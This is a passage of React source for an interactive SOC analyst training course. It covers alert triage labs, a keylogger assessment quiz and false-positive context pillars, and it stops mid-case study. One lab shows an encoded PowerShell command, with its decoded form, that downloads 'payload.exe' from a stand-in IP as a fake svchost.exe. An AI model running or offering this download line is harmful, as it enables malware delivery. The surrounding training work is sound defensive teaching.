                      { id: 'proc-4', name: 'conhost.exe', pid: '9040', ppid: '9024', user: 'FINCORP\\mchen', isMalicious: true, note: 'Console window host spawned by hidden PowerShell' },
                    ].map((proc, idx) => (
                      <div
                        key={proc.id}
                        onClick={() => setU3SelectedProcessNode(proc.id)}
                        className={`p-3 rounded-lg border cursor-pointer transition-all ${
                          u3SelectedProcessNode === proc.id
                            ? proc.isMalicious
                              ? 'bg-rose-50/70 border-rose-400 text-rose-950 dark:bg-rose-950/40 dark:text-rose-200'
                              : 'bg-primary/10 border-primary text-foreground'
                            : 'bg-muted/30 hover:bg-muted border-border text-muted-foreground'
                        }`}
                        style={{ marginLeft: `${idx * 16}px` }}
                      >
                        <div className="flex items-center justify-between">
                          <span className="font-bold flex items-center gap-1.5">
                            {idx > 0 && <span>└─</span>}
                            <span>{proc.name}</span>
                          </span>
                          <span className="text-[10px]">PID: {proc.pid} | PPID: {proc.ppid}</span>
                        </div>
                        {u3SelectedProcessNode === proc.id && (
                          <div className="mt-2 pt-2 border-t text-[11px] font-sans space-y-0.5 animate-fade-in">
                            <p><strong>Security Analysis:</strong> {proc.note}</p>
                            <p className="text-muted-foreground">User Context: {proc.user}</p>
                          </div>
                        )}
                      </div>
                    ))}
                  </div>
                </div>

                {/* Lab 2: Live Base64 Command Decoder */}
                <div className="p-4 rounded-xl border bg-card space-y-3">
                  <h4 className="text-xs font-bold text-foreground">Lab 2: Base64 Command Line Decoder</h4>
                  <p className="text-[11px] text-muted-foreground">
                    Telemetry extracted this obfuscated argument from PID 9024:
                  </p>
                  <div className="p-3 rounded-lg bg-slate-950 text-slate-200 font-mono text-xs break-all border border-slate-800">
                    powershell.exe -enc SW52b2tlLVdlYlJlcXVlc3QgLXVyaSAiaHR0cDovLzE5OC41MS4xMDAuODQvcGF5bG9hZC5leGUiIC1PdXRGaWxlICJDOlx0ZW1wXHN2Y2hvc3QuZXhlIg==
                  </div>

                  <div className="flex items-center justify-between pt-1">
                    <Button
                      size="sm"
                      onClick={() => setU3Base64Decoded(true)}
                      className="text-xs font-bold gap-1.5 bg-primary text-primary-foreground cursor-pointer"
                    >
                      <Terminal className="w-3.5 h-3.5" />
                      <span>{u3Base64Decoded ? 'Command Decoded ✓' : 'Decode Base64 Command'}</span>
                    </Button>
                    {u3Base64Decoded && <Badge className="bg-emerald-600 text-white text-[10px]">Decoded Successfully</Badge>}
                  </div>

                  {u3Base64Decoded && (
                    <div className="p-3.5 rounded-xl bg-slate-900 border border-emerald-500/40 text-emerald-300 font-mono text-xs space-y-2 animate-fade-in">
                      <span className="text-sky-400 font-bold block">DECODED ASCII PAYLOAD:</span>
                      <p className="bg-slate-950 p-2 rounded text-slate-100 border border-slate-800">
                        Invoke-WebRequest -uri &quot;http://198.51.100.84/payload.exe&quot; -OutFile &quot;C:\temp\svchost.exe&quot;
                      </p>
                      <div className="text-[11px] text-slate-300 font-sans space-y-1">
                        <p><strong>Analyst Breakdown:</strong> The script attempts to download an external executable from C2 IP `198.51.100.84` and save it as `svchost.exe` in `C:\temp\` to masquerade as a legitimate Windows Service Host!</p>
                      </div>
                    </div>
                  )}
                </div>

                {/* Lab 3: Live Threat Intelligence Hash Lookup */}
                <div className="p-4 rounded-xl border bg-card space-y-3">
                  <h4 className="text-xs font-bold text-foreground">Lab 3: Threat Intelligence Hash Reputation Lookup</h4>
                  <p className="text-[11px] text-muted-foreground">
                    Extracted attachment SHA-256: <code className="font-mono text-primary">e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855</code>
                  </p>
                  <div className="flex items-center justify-between">
                    <Button
                      size="sm"
                      onClick={() => setU3VtHashChecked(true)}
                      className="text-xs font-bold gap-1.5 bg-primary text-primary-foreground cursor-pointer"
                    >
                      <Search className="w-3.5 h-3.5" />
                      <span>{u3VtHashChecked ? 'Reputation Retrieved ✓' : 'Query Threat Intelligence Database'}</span>
                    </Button>
                    {u3VtHashChecked && <Badge className="bg-rose-600 text-white text-[10px]">Malicious Verdict (58/72)</Badge>}
                  </div>

                  {u3VtHashChecked && (
                    <div className="p-3.5 rounded-xl bg-rose-50 border border-rose-300 text-rose-950 dark:bg-rose-950/30 dark:border-rose-800 dark:text-rose-200 text-xs space-y-2 animate-fade-in font-sans">
                      <div className="flex items-center justify-between">
                        <span className="font-bold">VirusTotal Feed: 58/72 Antivirus Engines Flagged as Malicious</span>
                        <Badge className="bg-rose-600 text-white">Trojan.Downloader.Emotet</Badge>
                      </div>
                      <p className="text-[11px] leading-relaxed">
                        Known weaponized macro document associated with financial spear-phishing campaigns. First observed in wild: 48 hours ago. C2 infrastructure hosted on bulletproof Russian server IP.
                      </p>
                    </div>
                  )}
                </div>

                {/* Advance Bar */}
                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pt-3 border-t">
                  {!isU3Ch2Complete && !isChapterDone('unit-3', 2) && !freeNavigationEnabled ? (
                    <span className="text-amber-600 dark:text-amber-400 text-xs font-semibold flex items-center gap-1.5">
                      <Lock className="w-3.5 h-3.5" />
                      Inspect Process Node, Decode Command &amp; Query Threat Intel to unlock Chapter 3.3
                    </span>
                  ) : <div />}
                  <Button
                    disabled={!isU3Ch2Complete && !isChapterDone('unit-3', 2) && !freeNavigationEnabled}
                    onClick={() => {
                      markChapterDone('unit-3', 2);
                      setActiveSubStep(3);
                      onCompleteTopic('topic-3-2', 35);
                      onSelectTopic('unit-3-assessment');
                      window.scrollTo({ top: 0, behavior: 'smooth' });
                    }}
                    className="font-bold text-xs gap-1.5 bg-primary text-primary-foreground cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed"
                  >
                    <span>Advance to Chapter 3.3: Shift Assessment</span>
                    <ChevronRight className="w-4 h-4" />
                  </Button>
                </div>
              </CardContent>
            </Card>
          )}

          {/* CHAPTER 3.3: SHIFT ASSESSMENT */}
          {activeSubStep === 3 && (
            <Card className="shadow-xs border-primary/30 animate-fade-in">
              <CardHeader className="pb-3 border-b bg-primary/5">
                <div className="flex items-center justify-between">
                  <CardTitle className="text-base font-bold text-foreground flex items-center gap-2">
                    <Award className="w-4 h-4 text-primary" />
                    Chapter 3.3: Shift Assessment — Keylogger SEC-2026-0950
                  </CardTitle>
                  <Badge variant="outline" className="text-xs text-rose-600 bg-rose-50 border-rose-200">Priority Test</Badge>
                </div>
                <p className="text-xs text-muted-foreground mt-0.5">
                  Prove your alert triage skills under shift conditions. High score required to certify Unit 3.
                </p>
              </CardHeader>

              <CardContent className="p-5 sm:p-6 space-y-6">
                {/* Incident Telemetry Card */}
                <div className="p-4 rounded-xl bg-slate-900 text-slate-100 border border-slate-800 font-mono text-xs space-y-2">
                  <div className="flex items-center justify-between border-b border-slate-800 pb-2">
                    <span className="text-sky-400 font-bold">ALERT: SEC-2026-0950</span>
                    <span className="text-rose-400 font-bold">HIGH SEVERITY</span>
                  </div>
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 text-slate-300 text-[11px]">
                    <p><span className="text-slate-500">RULE:</span> Credential Access via In-Memory Keylogger DLL</p>
                    <p><span className="text-slate-500">USER:</span> pnair (Priya Nair, Finance Accounts Payable)</p>
                    <p><span className="text-slate-500">HOST:</span> FIN-BOS-PNAIR-W4521 (Win11 Corporate Laptop)</p>
                    <p><span className="text-slate-500">TIME:</span> 11:22:45 AM EST (Shift Hours)</p>
                    <p><span className="text-slate-500">PROCESS:</span> explorer.exe -&gt; rundll32.exe C:\Users\pnair\AppData\Local\Temp\hook.dll</p>
                    <p><span className="text-slate-500">EVENT COUNT:</span> 1 Occurrence</p>
                  </div>
                </div>

                <div className="space-y-4 text-xs">
                  {/* Question 1 */}
                  <div className="p-4 rounded-xl border bg-card space-y-2">
                    <span className="font-bold text-foreground block">
                      Question 1: Extract the 5 anchors. What is the most critical risk vector in this telemetry?
                    </span>
                    <div className="space-y-1.5">
                      {[
                        { id: 'q1-a', text: 'A) The user is Priya Nair in Accounts Payable with access to banking portals and payment credentials.' },
                        { id: 'q1-b', text: 'B) The host is running Windows 11 Enterprise.' },
                        { id: 'q1-c', text: 'C) The event count is only 1, so it should be ignored as background noise.' },
                      ].map((opt) => (
                        <button
                          key={opt.id}
                          onClick={() => setU3KcQ1Answer(opt.id)}
                          className={`p-2.5 rounded-lg border text-left w-full transition-all ${
                            u3KcQ1Answer === opt.id
                              ? opt.id === 'q1-a'
                                ? 'bg-emerald-50 border-emerald-500 text-emerald-950 font-bold'
                                : 'bg-rose-50 border-rose-500 text-rose-950'
                              : 'bg-card hover:bg-muted border-border'
                          }`}
                        >
                          {opt.text}
                        </button>
                      ))}
                    </div>
                  </div>

                  {/* Question 2 */}
                  <div className="p-4 rounded-xl border bg-card space-y-2">
                    <span className="font-bold text-foreground block">
                      Question 2: Why is this alert HIGH priority despite only having an event count of 1?
                    </span>
                    <div className="space-y-1.5">
                      {[
                        { id: 'opt-k1', text: 'A) Any active keylogger steals banking passwords and customer payment tokens directly from keyboard memory, representing an immediate credential compromise threat.' },
                        { id: 'opt-k2', text: 'B) It is not high priority; single occurrences on laptops should always be marked Low priority.' },
                      ].map((opt) => (
                        <button
                          key={opt.id}
                          onClick={() => setU3KcQ2Answer(opt.id)}
                          className={`p-2.5 rounded-lg border text-left w-full transition-all ${
                            u3KcQ2Answer === opt.id
                              ? opt.id === 'opt-k1'
                                ? 'bg-emerald-50 border-emerald-500 text-emerald-950 font-bold'
                                : 'bg-rose-50 border-rose-500 text-rose-950'
                              : 'bg-card hover:bg-muted border-border'
                          }`}
                        >
                          {opt.text}
                        </button>
                      ))}
                    </div>
                  </div>

                  {/* Question 3 */}
                  <div className="p-4 rounded-xl border bg-card space-y-2">
                    <span className="font-bold text-foreground block">
                      Question 3: What is the mandatory immediate triage action?
                    </span>
                    <div className="space-y-1.5">
                      {[
                        { id: 'q3-a', text: 'A) Isolate host FIN-BOS-PNAIR-W4521 from the network via EDR, force reset Priya Nair’s AD password, and escalate ticket to Priya (L2).' },
                        { id: 'q3-b', text: 'B) Email Priya Nair asking if she installed the hook.dll file herself and close the ticket.' },
                        { id: 'q3-c', text: 'C) Wait until end of shift to see if any credit card alerts trigger.' },
                      ].map((opt) => (
                        <button
                          key={opt.id}
                          onClick={() => setU3KcQ3Answer(opt.id)}
                          className={`p-2.5 rounded-lg border text-left w-full transition-all ${
                            u3KcQ3Answer === opt.id
                              ? opt.id === 'q3-a'
                                ? 'bg-emerald-50 border-emerald-500 text-emerald-950 font-bold'
                                : 'bg-rose-50 border-rose-500 text-rose-950'
                              : 'bg-card hover:bg-muted border-border'
                          }`}
                        >
                          {opt.text}
                        </button>
                      ))}
                    </div>
                  </div>
                </div>

                {(u3KcSubmitted || (mounted && (completedUnits.has('unit-3') || completedUnits.has('unit-3-assessment')))) ? (
                  <div className="p-4 rounded-xl border border-emerald-300 bg-emerald-50/70 text-emerald-950 flex flex-col sm:flex-row items-center justify-between gap-3 animate-fade-in" suppressHydrationWarning>
                    <div>
                      <span className="font-bold text-emerald-800 block">🎉 Unit 3 Certified! (+100 XP)</span>
                      <p className="text-xs text-emerald-700">You mastered rapid alert triage, 5-field entity extraction, process trees, and live decoding.</p>
                    </div>
                    <Button
                      suppressHydrationWarning
                      onClick={() => onSelectTopic('topic-4-1')}
                      className="font-bold text-xs gap-1.5 bg-emerald-600 hover:bg-emerald-700 text-white shrink-0 cursor-pointer"
                    >
                      <span>Proceed to Unit 4: False Positives</span>
                      <ChevronRight className="w-4 h-4" />
                    </Button>
                  </div>
                ) : (
                  <div className="flex flex-col sm:flex-row items-center justify-between gap-3 pt-2">
                    <Button
                      variant="outline"
                      size="sm"
                      onClick={() => {
                        setU3KcQ1Answer('');
                        setU3KcQ2Answer('');
                        setU3KcQ3Answer('');
                      }}
                      className="text-xs gap-1"
                    >
                      <RotateCcw className="w-3 h-3" />
                      Reset Assessment
                    </Button>
                    <Button
                      disabled={u3KcQ1Answer !== 'q1-a' || u3KcQ2Answer !== 'opt-k1' || u3KcQ3Answer !== 'q3-a'}
                      onClick={() => {
                        markChapterDone('unit-3', 3);
                        setU3KcSubmitted(true);
                        handleFinishAssessment('unit-3-assessment', 100);
                      }}
                      className="font-bold text-xs gap-1.5 bg-primary text-primary-foreground cursor-pointer w-full sm:w-auto disabled:opacity-50 disabled:cursor-not-allowed"
                    >
                      <Award className="w-4 h-4" />
                      <span>Submit &amp; Certify Unit 3 (+100 XP)</span>
                      <ChevronRight className="w-4 h-4" />
                    </Button>
                  </div>
                )}
              </CardContent>
            </Card>
          )}
        </div>
      )}

      {/* ====================================================
          UNIT 4: FALSE POSITIVES & CONTEXT INVESTIGATION
         ==================================================== */}
      {unitId === 'unit-4' && (
        <div className="space-y-6">
          {/* Unit 4 Chapter Navigation Tabs */}
          <div className="rounded-2xl border bg-card shadow-sm overflow-hidden">
            <div className="p-2 sm:p-3 bg-card flex items-center justify-between gap-2 overflow-x-auto border-b">
              <div className="flex items-center gap-1 sm:gap-2">
                {[
                  { num: 1, label: 'Chapter 4.1: The 5 Pillars of Context', topicId: 'topic-4-1' },
                  { num: 2, label: 'Chapter 4.2: TP vs FP Decision Board', topicId: 'topic-4-2' },
                  { num: 3, label: 'Chapter 4.3: Shift Assessment', topicId: 'unit-4-assessment' },
                ].map((tab) => {
                  const isDone = isChapterDone('unit-4', tab.num) || (mounted && tab.num === 3 && (completedUnits.has('unit-4') || completedUnits.has('unit-4-assessment')));
                  const locked = isChapterLocked('unit-4', tab.num);
                  const isActive = activeSubStep === tab.num;
                  return (
                    <button
                      key={tab.num}
                      type="button"
                      suppressHydrationWarning
                      onClick={() => {
                        if (locked) {
                          showToast({
                            type: 'warning',
                            title: 'Chapter Locked 🔒',
                            description: `Complete Chapter 4.${tab.num - 1} first to unlock this chapter.`,
                          });
                          return;
                        }
                        setActiveSubStep(tab.num);
                        onSelectTopic(tab.topicId);
                        window.scrollTo({ top: 0, behavior: 'smooth' });
                      }}
                      className={`px-3 py-1.5 rounded-lg text-xs font-semibold transition-all whitespace-nowrap flex items-center gap-1.5 ${
                        isActive
                          ? 'bg-primary text-primary-foreground shadow-xs font-bold'
                          : isDone
                          ? 'bg-emerald-50 text-emerald-800 hover:bg-emerald-100 border border-emerald-300 dark:bg-emerald-950/40 dark:text-emerald-300 dark:border-emerald-800'
                          : locked
                          ? 'opacity-60 cursor-not-allowed text-muted-foreground border border-border/60'
                          : 'hover:bg-muted text-muted-foreground border border-border/60'
                      }`}
                    >
                      {isDone ? (
                        <CheckCircle2 className="w-3 h-3 text-emerald-600 dark:text-emerald-400" />
                      ) : locked ? (
                        <Lock className="w-3 h-3 text-muted-foreground/60" />
                      ) : null}
                      <span>{tab.label}</span>
                    </button>
                  );
                })}
              </div>
              <div className="hidden md:flex items-center gap-2 shrink-0 text-xs text-muted-foreground font-mono">
                <span>Unit 4 — Chapter {activeSubStep} of 3</span>
              </div>
            </div>
          </div>

          {/* CHAPTER 4.1: THE 5 PILLARS OF CONTEXT */}
          {activeSubStep === 1 && (
            <Card className="shadow-xs border-border animate-fade-in">
              <CardHeader className="pb-3 border-b bg-muted/20">
                <CardTitle className="text-base font-bold text-foreground flex items-center gap-2">
                  <Sliders className="w-4 h-4 text-primary" />
                  Chapter 4.1: The 5-Pillar Context Investigation Framework
                </CardTitle>
                <p className="text-xs text-muted-foreground mt-0.5">
                  Understand why alerts alone lie: Discover how User, Time, Tool, Approval, and Scope turn noise into clarity.
                </p>
              </CardHeader>

              <CardContent className="p-5 sm:p-6 space-y-6">
                {/* Mentor Quote */}
                <div className="p-4 rounded-xl border border-amber-200 bg-amber-50/50 dark:bg-amber-950/20 dark:border-amber-800 text-xs space-y-2">
                  <div className="flex items-center gap-2 font-bold text-amber-900 dark:text-amber-300">
                    <span className="w-6 h-6 rounded-full bg-amber-600 text-white flex items-center justify-center text-[10px]">RK</span>
                    <span>Rajesh Kumar: &ldquo;Alert Alone = Panic. Alert + Context = True Verdict.&rdquo;</span>
                  </div>
                  <p className="text-amber-950 dark:text-amber-200 leading-relaxed">
                    &ldquo;Imagine a security guard seeing someone climbing through an open office window at 2:00 AM. It looks like a burglar! But context tells you it is the building maintenance supervisor who locked his keys inside and has an approved emergency repair order. If you escalate every single alert without context, you will drown Tier 2 in false alarms. But if you dismiss real threats, FinCorp gets breached. Here are the 5 pillars we use every shift.&rdquo;
                  </p>
                </div>

                {/* Conceptual Definitions: False Positive vs Benign vs True Positive */}
                <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 text-xs">
                  <div className="p-3.5 rounded-xl border bg-muted/20 space-y-1">
                    <Badge variant="outline" className="text-sky-600 border-sky-300 dark:text-sky-400">Concept 1</Badge>
                    <span className="font-bold text-foreground block">False Positive (FP)</span>
                    <p className="text-muted-foreground text-[11px] leading-relaxed">
                      The detection rule triggered incorrectly on harmless noise (e.g. vulnerability scanner running its scheduled weekly port sweep). No attack ever took place.
                    </p>
                  </div>

                  <div className="p-3.5 rounded-xl border bg-muted/20 space-y-1">
                    <Badge variant="outline" className="text-emerald-600 border-emerald-300 dark:text-emerald-400">Concept 2</Badge>
                    <span className="font-bold text-foreground block">Benign Activity / Expected</span>
                    <p className="text-muted-foreground text-[11px] leading-relaxed">
                      The detection rule triggered correctly on a powerful action (e.g. IT admin running PowerShell to install software), but it was planned, authorized, and approved by change ticket.
                    </p>
                  </div>

                  <div className="p-3.5 rounded-xl border bg-muted/20 space-y-1">
                    <Badge variant="outline" className="text-rose-600 border-rose-300 dark:text-rose-400">Concept 3</Badge>
                    <span className="font-bold text-foreground block">True Positive (TP)</span>
                    <p className="text-muted-foreground text-[11px] leading-relaxed">
                      A genuine adversary attack or unauthorized malicious action in progress. Immediate host containment and escalation are mandatory to prevent data loss.
                    </p>
                  </div>
                </div>

                {/* The 5 Pillar Interactive Explorer */}
                <div className="p-4 rounded-xl border bg-card space-y-4">
                  <div>
                    <h4 className="text-xs font-bold text-foreground uppercase tracking-wider font-mono">
                      Interactive Explorer: Click Each of the 5 Pillars of Context
                    </h4>
                    <p className="text-[11px] text-muted-foreground">Review each pillar to understand how analysts evaluate real-world evidence.</p>
                  </div>

                  <div className="flex flex-wrap gap-2">
                    {[
                      { id: 1, name: '1. USER PILLAR', icon: Users },
                      { id: 2, name: '2. TIME PILLAR', icon: Clock },
                      { id: 3, name: '3. TOOL PILLAR', icon: Terminal },
                      { id: 4, name: '4. APPROVAL PILLAR', icon: FileCheck },
                      { id: 5, name: '5. SCOPE & PRECEDENT', icon: Layers },
                    ].map((pil) => {
                      const Icon = pil.icon;
                      const isSelected = u4ActivePillar === pil.id;
                      const isReviewed = u4PillarsReviewed.includes(pil.id);
                      return (
                        <button
                          key={pil.id}
                          onClick={() => {
                            setU4ActivePillar(pil.id);
                            if (!u4PillarsReviewed.includes(pil.id)) {
                              setU4PillarsReviewed((prev) => [...prev, pil.id]);
                            }
                          }}
                          className={`px-3 py-2 rounded-lg text-xs font-bold border flex items-center gap-1.5 transition-all cursor-pointer ${
                            isSelected
                              ? 'bg-primary text-primary-foreground border-primary shadow-xs'
                              : isReviewed
                              ? 'bg-primary/5 text-primary border-primary/30 hover:bg-muted'
                              : 'bg-card hover:bg-muted border-border text-muted-foreground'
                          }`}
                        >
                          <Icon className="w-3.5 h-3.5" />
                          <span>{pil.name}</span>
                          {isReviewed && <Check className="w-3 h-3 text-emerald-500 ml-0.5" />}
                        </button>
                      );
                    })}
                  </div>

                  {/* Active Pillar Card */}
                  {(() => {
                    const pillarContent = [
                      {
                        title: 'The User Pillar: Who is executing the action?',
                        analogy: 'The Security Badge & Job Role',
                        questions: ['Does this employee’s job description involve command-line scripting or database exports?', 'Is the account a human user or an automated service account?', 'Has this account recently requested password resets?'],
                        greenFlag: 'A Senior DevOps Engineer running Docker or Terraform scripts.',
                        redFlag: 'An Accounts Payable clerk running encoded PowerShell scripts at midnight.',
                      },
                      {
                        title: 'The Time Pillar: When did the action occur?',
                        analogy: 'The Timeclock & Maintenance Windows',
                        questions: ['Is the event within the employee’s regular working hours (08:30 - 17:30)?', 'Does the timestamp align with a declared maintenance window (e.g. Sunday 02:00 - 04:00)?', 'Is the user logging in from a conflicting time zone (e.g. Boston and London 5 minutes apart)?'],
                        greenFlag: 'Batch backup job executing during Saturday 03:00 AM maintenance window.',
                        redFlag: 'Mass file compression at 23:45 PM on a Sunday by an employee off-shift.',
                      },
                      {
                        title: 'The Tool Pillar: What program was used?',
                        analogy: 'The Tool in Hand (Living-off-the-Land vs Malware)',
                        questions: ['Is it a native administrative Windows executable (e.g. powershell.exe, certutil.exe, wmic.exe)?', 'Is it executing from a recognized system folder (C:\\Windows\\System32) or a user temporary folder (C:\\Users\\...\\AppData\\Local\\Temp)?', 'Are command-line arguments plain English or heavily obfuscated with Base64?'],
                        greenFlag: 'PowerShell executing signed corporate update script from IT Software Portal.',
                        redFlag: '`rundll32.exe` executing an unsigned `.tmp` DLL from the user Downloads directory.',
                      },
                      {
                        title: 'The Approval Pillar: Is there a documented Change Request?',
                        analogy: 'The Building Work Permit',
                        questions: ['Is there an approved Change Request (CR) or Help Desk ticket in ServiceNow?', 'Did the system administrator log the activity in advance?', 'Does the ticket specify the exact host, timestamp, and script being run?'],
                        greenFlag: 'Approved Change Request #CR-8820: "Decommissioning legacy Boston File Server, migrating archives."',
                        redFlag: 'Zero tickets, no Slack notification, and system owner confirms no knowledge.',
                      },
                      {
                        title: 'The Scope & Precedent Pillar: Has this happened before?',
                        analogy: 'The Historical Track Record',
                        questions: ['Has this host or user run this identical script every Monday for the last 6 months?', 'Is this action happening on 1 machine or simultaneously spreading across 50 machines?', 'Is the destination IP an established corporate vendor or a brand-new dynamic domain?'],
                        greenFlag: 'Weekly scheduled vulnerability scanner running authenticated checks.',
                        redFlag: 'A machine contacting an IP registered 12 hours ago with zero historical traffic.',
                      },
                    ][u4ActivePillar - 1];

                    return (
                      <div className="p-4 rounded-xl border bg-muted/20 space-y-3 text-xs animate-fade-in">
                        <div className="flex items-center justify-between border-b pb-2">
                          <h5 className="font-bold text-foreground text-sm">{pillarContent.title}</h5>
                          <Badge variant="outline" className="font-mono text-[10px]">{pillarContent.analogy}</Badge>
                        </div>

                        <div className="space-y-1.5">
                          <span className="font-semibold text-foreground block">Key Questions the L1 Analyst Must Ask:</span>
                          <ul className="list-disc list-inside space-y-0.5 text-muted-foreground text-[11px]">
                            {pillarContent.questions.map((q, idx) => (
                              <li key={idx}>{q}</li>
                            ))}
                          </ul>
                        </div>

                        <div className="grid grid-cols-1 sm:grid-cols-2 gap-2.5 pt-1 text-[11px]">
                          <div className="p-2.5 rounded-lg bg-emerald-50 border border-emerald-300 text-emerald-950 dark:bg-emerald-950/30 dark:border-emerald-800 dark:text-emerald-200">
                            <strong>✓ Green Flag (Benign / Expected):</strong> {pillarContent.greenFlag}
                          </div>
                          <div className="p-2.5 rounded-lg bg-rose-50 border border-rose-300 text-rose-950 dark:bg-rose-950/30 dark:border-rose-800 dark:text-rose-200">
                            <strong>🚨 Red Flag (True Positive / Malicious):</strong> {pillarContent.redFlag}
                          </div>
                        </div>
                      </div>
                    );
                  })()}
                </div>

                {/* Advance Bar */}
                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pt-3 border-t">
                  {!isU4Ch1Complete && !isChapterDone('unit-4', 1) && !freeNavigationEnabled ? (
                    <span className="text-amber-600 dark:text-amber-400 text-xs font-semibold flex items-center gap-1.5">
                      <Lock className="w-3.5 h-3.5" />
                      Review at least 3 pillars above ({u4PillarsReviewed.length}/3) to unlock Chapter 4.2
                    </span>
                  ) : <div />}
                  <Button
                    disabled={!isU4Ch1Complete && !isChapterDone('unit-4', 1) && !freeNavigationEnabled}
                    onClick={() => {
                      markChapterDone('unit-4', 1);
                      setActiveSubStep(2);
                      onCompleteTopic('topic-4-1', 35);
                      onSelectTopic('topic-4-2');
                      window.scrollTo({ top: 0, behavior: 'smooth' });
                    }}
                    className="font-bold text-xs gap-1.5 bg-primary text-primary-foreground cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed"
                  >
                    <span>Advance to Chapter 4.2: TP vs FP Decision Board</span>
                    <ChevronRight className="w-4 h-4" />
                  </Button>
                </div>
              </CardContent>
            </Card>
          )}

          {/* CHAPTER 4.2: TP VS FP DECISION BOARD */}
          {activeSubStep === 2 && (
            <Card className="shadow-xs border-border animate-fade-in">
              <CardHeader className="pb-3 border-b bg-muted/20 flex flex-col sm:flex-row sm:items-center justify-between gap-3">
                <div>
                  <CardTitle className="text-base font-bold text-foreground flex items-center gap-2">
                    <Shield className="w-4 h-4 text-primary" />
                    Chapter 4.2: False Positive vs. True Positive Decision Board
                  </CardTitle>
                  <p className="text-xs text-muted-foreground mt-0.5">
                    Evaluate 4 live FinCorp queue scenarios using the 5 Context Pillars.
                  </p>
                </div>
                <Button
                  variant="outline"
                  size="sm"
                  onClick={() => setU4ContextScenarioAnswers({})}
                  className="text-xs gap-1 h-7"
                >
                  <RotateCcw className="w-3 h-3" />
                  Reset Scenarios
                </Button>
              </CardHeader>

              <CardContent className="p-5 sm:p-6 space-y-6">
                {/* Interactive SOC Dashboard Lab Launcher */}
                <CourseLabLauncher
                  labId="lab-02"
                  onLabCompleted={() => {
                    markChapterDone('unit-4', 2);
                    onCompleteTopic('topic-4-2', 50);
                  }}
                />

                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 text-xs">
                  {UNIT_4_CONTEXT_SCENARIOS.map((sc) => {
                    const userAnswer = u4ContextScenarioAnswers[sc.id];
                    const isAnswered = !!userAnswer;
                    const isCorrect = userAnswer === sc.verdict;
                    return (
                      <div key={sc.id} className="p-4 rounded-xl border bg-card space-y-3 shadow-xs">
                        <div className="flex items-center justify-between border-b pb-2">
                          <span className="font-bold text-foreground">{sc.title}</span>
                          <Badge variant="outline" className="font-mono text-[10px]">{sc.alertId}</Badge>
                        </div>

                        <div className="space-y-1.5 text-muted-foreground text-[11px]">
                          <p><strong className="text-foreground">User:</strong> {sc.userContext}</p>
                          <p><strong className="text-foreground">Time:</strong> {sc.timeContext}</p>
                          <p><strong className="text-foreground">Tool:</strong> {sc.toolContext}</p>
                          <p><strong className="text-foreground">Approval:</strong> {sc.approvalContext}</p>
                        </div>

                        <div className="pt-1 space-y-2">
                          <span className="font-bold text-primary block">Your Context Verdict:</span>
                          <div className="grid grid-cols-2 gap-1.5">
                            {['EXPECTED ACTIVITY', 'TRUE POSITIVE'].map((v) => (
                              <button
                                key={v}
                                onClick={() => setU4ContextScenarioAnswers((prev) => ({ ...prev, [sc.id]: v }))}
                                className={`p-2 rounded text-center font-bold border transition-all text-[11px] ${
                                  userAnswer === v
                                    ? v === sc.verdict
                                      ? 'bg-emerald-600 text-white border-emerald-600'
                                      : 'bg-rose-600 text-white border-rose-600'
                                    : 'bg-card hover:bg-muted border-border text-foreground'
                                }`}
                              >
                                {v}
                              </button>
                            ))}
                          </div>

                          {isAnswered && (
                            <div className={`p-2.5 rounded-lg text-[11px] space-y-1 animate-fade-in ${isCorrect ? 'bg-emerald-50 text-emerald-950 border border-emerald-300 dark:bg-emerald-950/30 dark:border-emerald-800 dark:text-emerald-200' : 'bg-rose-50 text-rose-950 border border-rose-300 dark:bg-rose-950/30 dark:border-rose-800 dark:text-rose-200'}`}>
                              <p><strong>Action:</strong> {sc.action}</p>
                              <p className="opacity-90">{sc.explanation}</p>
                            </div>
                          )}
                        </div>
                      </div>
                    );
                  })}
                </div>

                {/* Advance Bar */}
                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pt-3 border-t">
                  {!isU4Ch2Complete && !isChapterDone('unit-4', 2) && !freeNavigationEnabled ? (
                    <span className="text-amber-600 dark:text-amber-400 text-xs font-semibold flex items-center gap-1.5">
                      <Lock className="w-3.5 h-3.5" />
                      Classify at least 2 context scenarios above ({Object.keys(u4ContextScenarioAnswers).length}/2) to unlock Chapter 4.3
                    </span>
                  ) : <div />}
                  <Button
                    disabled={!isU4Ch2Complete && !isChapterDone('unit-4', 2) && !freeNavigationEnabled}
                    onClick={() => {
                      markChapterDone('unit-4', 2);
                      setActiveSubStep(3);
                      onCompleteTopic('topic-4-2', 35);
                      onSelectTopic('unit-4-assessment');
                      window.scrollTo({ top: 0, behavior: 'smooth' });
                    }}
                    className="font-bold text-xs gap-1.5 bg-primary text-primary-foreground cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed"
                  >
                    <span>Advance to Chapter 4.3: Shift Assessment</span>
                    <ChevronRight className="w-4 h-4" />
                  </Button>
                </div>
              </CardContent>
            </Card>
          )}

          {/* CHAPTER 4.3: SHIFT ASSESSMENT */}
          {activeSubStep === 3 && (
            <Card className="shadow-xs border-primary/30 animate-fade-in">
              <CardHeader className="pb-3 border-b bg-primary/5">
                <div className="flex items-center justify-between">
                  <CardTitle className="text-base font-bold text-foreground flex items-center gap-2">
                    <Award className="w-4 h-4 text-primary" />
                    Chapter 4.3: Shift Assessment — BitLocker Diagnostic
                  </CardTitle>
                  <Badge variant="outline" className="text-xs text-primary bg-primary/10">Certification Test</Badge>
                </div>
                <p className="text-xs text-muted-foreground mt-0.5">
                  Apply full context analysis to differentiate between authorized enterprise security maintenance and an active ransomware incident.
                </p>
              </CardHeader>

              <CardContent className="p-5 sm:p-6 space-y-6">
                <div className="p-4 rounded-xl bg-slate-900 text-slate-100 border border-slate-800 font-mono text-xs space-y-2">
                  <div className="flex items-center justify-between border-b border-slate-800 pb-2">
                    <span className="text-amber-400 font-bold">CASE STUDY: ALERT SEC-2026-1050 (Bulk Disk Encryption Trigger)</span>
                    <Badge className="bg-rose-500/20 text-rose-300 border-rose-500/30 text-[10px]">POTENTIAL RANSOMWARE</Badge>
                  </div>
                  <div className="space-y-1.5 text-slate-300 text-[11px]">
